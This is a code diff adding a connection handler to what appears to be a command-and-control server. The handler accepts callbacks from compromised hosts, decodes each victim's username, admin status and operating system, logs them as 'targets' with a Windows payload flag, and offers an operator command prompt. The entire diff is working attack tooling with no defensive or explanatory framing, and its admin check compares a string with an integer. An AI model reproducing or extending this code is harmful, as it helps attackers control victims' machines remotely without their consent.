@@ -87,3 +87,38 @@ def listener_handler():
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.start()
+
+def comm_handler():
+    while True:
+        if kill_flag == 1:
+            break
+        try:
+            remote_target, remote_ip = sock.accept()
+            username = remote_target.recv(1024).decode()
+            username = base64.b64decode(username).decode()
+            admin = remote_target.recv(1024).decode()
+            admin = base64.b64decode(admin).decode()
+            op_sys = remote_target.recv(4096).decode()
+            op_sys = base64.b64decode(op_sys).decode()
+            if admin == 1:
+                admin_val = 'Yes'
+            elif username == 'root':
+                admin_val = 'Yes'
+            else:
+                admin_val = 'No'
+            if 'Windows' in op_sys:
+                pay_val = 1
+            else:
+                pay_val = 2
+            cur_time = time.strftime("%H:%M:%S", time.localtime())
+            date = datetime.now()
+            time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
+            host_name = socket.gethostbyaddr(remote_ip[0])
+            if host_name is not None:
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, op_sys, pay_val, 'Active'])
+                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
+            else:
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, op_sys, pay_val, 'Active'])
+                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
+        except:
+            pass
